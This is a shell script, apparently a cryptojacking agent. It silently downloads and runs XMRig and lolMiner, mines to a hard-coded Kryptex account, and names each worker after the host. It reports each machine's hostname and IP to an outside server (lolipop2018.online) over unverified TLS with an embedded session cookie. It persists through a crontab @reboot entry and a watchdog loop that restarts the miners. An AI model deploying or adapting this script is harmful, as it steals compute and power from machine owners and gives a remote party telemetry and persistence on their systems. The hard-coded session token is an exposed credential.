#!/bin/sh
set -u

#################################################
# MINING AGENT — CPU + GPU (KRYPTEX)
# TELEMETRY → API (lolipop2018.online)
# TELEGRAM: ВЫРЕЗАН ПОЛНОСТЬЮ
#################################################

[ "${ALLOW_MINING:-0}" = "1" ] || exit 0

HOST="$(hostname)"
INTERVAL=30

# ===== ACCOUNTS =====
KRIPTEX="krxX3PVQVR"

# ===== POOLS =====
XMR_POOL="xmr.kryptex.network:7029"
ETC_POOL="etc.kryptex.network:7033"

# ===== API CONFIG =====
API_BASE="https://lolipop2018.online"
AUTH_SESSION="_CKU0PGWv9EwWBJmdNJyZDF5AdkJ4KJa2Gv2GV9fVe0"
API_HDR="-H \"Content-Type: application/json\" -H \"Cookie: auth_session=${AUTH_SESSION}\""
API_OPTS="-s --connect-timeout 10 --max-time 15 -k"

# ===== API HELPERS =====
api_post() {
  _ep="$1"; shift
  _data="$1"; shift
  curl $API_OPTS -X POST "${API_BASE}${_ep}" ${API_HDR} -d "${_data}" >/dev/null 2>&1 || true
}

api_get() {
  _ep="$1"; shift
  curl $API_OPTS -X GET "${API_BASE}${_ep}" ${API_HDR} >/dev/null 2>&1 || true
}

api_heartbeat() {
  _event="${1:-heartbeat}"; _msg="${2:-}"; _runid="${3:-}"
  _ip="$(hostname -I | awk '{print $1}' 2>/dev/null || echo '0.0.0.0')"
  _json="{\"username\":\"${HOST}\",\"ip\":\"${_ip}\",\"event\":\"${_event}\""
  [ -n "$_msg" ] && _json="${_json},\"message\":\"${_msg}\""
  [ -n "$_runid" ] && _json="${_json},\"run_id\":\"${_runid}\""
  _json="${_json}}"
  api_post "/api/heartbeat" "$_json"
}

api_log() {
  _msg="$1"; _runid="${2:-}"
  _ip="$(hostname -I | awk '{print $1}' 2>/dev/null || echo '0.0.0.0')"
  _json="{\"username\":\"${HOST}\",\"ip\":\"${_ip}\",\"message\":\"${_msg}\""
  [ -n "$_runid" ] && _json="${_json},\"run_id\":\"${_runid}\""
  _json="${_json}}"
  api_post "/api/logs/push" "$_json"
}

# ===== PATHS =====
BASE="$HOME/.mining"
BIN="$BASE/bin"
RUN="$BASE/run"
LOG="$BASE/log"

mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" "$LOG" >/dev/null 2>&1

api_heartbeat "agent_start" "Mining agent initialized"

#################################################
# INSTALLERS
#################################################

install_xmrig() {
  api_log "Installing XMRig"

  pkill xmrig 2>/dev/null || true
  rm -f "$BIN/cpu/xmrig"

  for URL in \
    "https://xmrig.com/download/xmrig-6.25.0-linux-static-x64.tar.gz" \
    "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz"
  do
    wget -q "$URL" -O /tmp/xmrig.tgz || continue
    tar -xzf /tmp/xmrig.tgz -C "$BIN/cpu" --strip-components=1 || continue
    chmod +x "$BIN/cpu/xmrig"

    if [ -x "$BIN/cpu/xmrig" ]; then
      api_log "XMRig installed successfully"
      return 0
    fi
  done

  api_log "ERROR: XMRig installation failed"
  return 1
}

install_lolminer() {
  api_log "Installing lolMiner"

  pkill lolMiner 2>/dev/null || true
  rm -f "$BIN/gpu/lolMiner"

  for URL in \
    "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"
  do
    wget -q "$URL" -O /tmp/lolminer.tgz || continue
    tar -xzf /tmp/lolminer.tgz -C "$BIN/gpu" --strip-components=1 || continue
    chmod +x "$BIN/gpu/lolMiner"

    if [ -x "$BIN/gpu/lolMiner" ]; then
      api_log "lolMiner installed successfully"
      return 0
    fi
  done

  api_log "ERROR: lolMiner installation failed"
  return 1
}

#################################################
# CPU (XMRig)
#################################################

start_cpu() {
  pkill xmrig 2>/dev/null || true
  "$BIN/cpu/xmrig" \
    -o "$XMR_POOL" \
    -u "$KRIPTEX.$HOST" -p x \
    --http-enabled --http-host 127.0.0.1 --http-port 16000 \
    >> "$LOG/cpu.log" 2>&1 &
  echo $! > "$RUN/cpu.pid"
  api_heartbeat "cpu_started" "XMRig launched"
}

#################################################
# GPU (lolMiner)
#################################################

start_gpu() {
  pkill lolMiner 2>/dev/null || true
  "$BIN/gpu/lolMiner" \
    --algo ETCHASH \
    --pool "$ETC_POOL" \
    --user "$KRIPTEX.$HOST" \
    --ethstratum ETCPROXY \
    --apihost 127.0.0.1 --apiport 8080 \
    >> "$LOG/gpu.log" 2>&1 &
  echo $! > "$RUN/gpu.pid"
  api_heartbeat "gpu_started" "lolMiner launched"
}

#################################################
# HASHRATE (для watchdog)
#################################################

get_cpu_hr() {
  curl -s --max-time 2 http://127.0.0.1:16000/1/summary \
    | grep -oE '"total":\[[^]]+' \
    | grep -oE '[0-9]+' \
    | head -1 || echo 0
}

get_gpu_hr() {
  curl -s --max-time 2 http://127.0.0.1:8080/summary \
    | grep -oE '"Performance":[ ]*[0-9]+(\.[0-9]+)?' \
    | grep -oE '[0-9]+(\.[0-9]+)?' || echo 0
}

#################################################
# AUTOSTART
#################################################

ensure_autostart() {
  crontab -l 2>/dev/null | grep -q min1.sh && return
  (crontab -l 2>/dev/null; echo "@reboot ALLOW_MINING=1 $BASE/min1.sh") | crontab -
  api_log "Autostart configured via crontab"
}

#################################################
# MAIN
#################################################

CPU_OK=0
GPU_OK=0
RUN_ID="run_$(date +%s)_${HOST}"

install_xmrig && CPU_OK=1
install_lolminer && GPU_OK=1

ensure_autostart

[ "$CPU_OK" = "1" ] && start_cpu || api_log "ERROR: CPU miner failed to start"
[ "$GPU_OK" = "1" ] && start_gpu || api_log "ERROR: GPU miner failed to start"

if [ "$CPU_OK" = "1" ] || [ "$GPU_OK" = "1" ]; then
  api_heartbeat "mining_started" "CPU=${CPU_OK} GPU=${GPU_OK}" "$RUN_ID"
else
  api_heartbeat "mining_failed" "No miners started" "$RUN_ID"
fi

#################################################
# WATCHDOG LOOP
#################################################

while true; do
  # Перезапуск если процесс упал
  [ -f "$RUN/cpu.pid" ] && kill -0 "$(cat "$RUN/cpu.pid")" 2>/dev/null || { [ "$CPU_OK" = "1" ] && start_cpu && api_log "CPU watchdog restarted"; }
  [ -f "$RUN/gpu.pid" ] && kill -0 "$(cat "$RUN/gpu.pid")" 2>/dev/null || { [ "$GPU_OK" = "1" ] && start_gpu && api_log "GPU watchdog restarted"; }

  # Проверка хешрейта GPU
  GPU_HR="$(get_gpu_hr | sed 's/\..*//')"
  if [ -n "$GPU_HR" ] && [ "$GPU_HR" -eq 0 ] && [ "$GPU_OK" = "1" ]; then
    start_gpu
    api_log "GPU watchdog: zero hashrate detected, restarted"
  fi

  # Периодический heartbeat
  api_heartbeat "watchdog_tick" "CPU=$(get_cpu_hr) H/s GPU=${GPU_HR:-0} MH/s" "$RUN_ID"

  sleep "$INTERVAL"
done
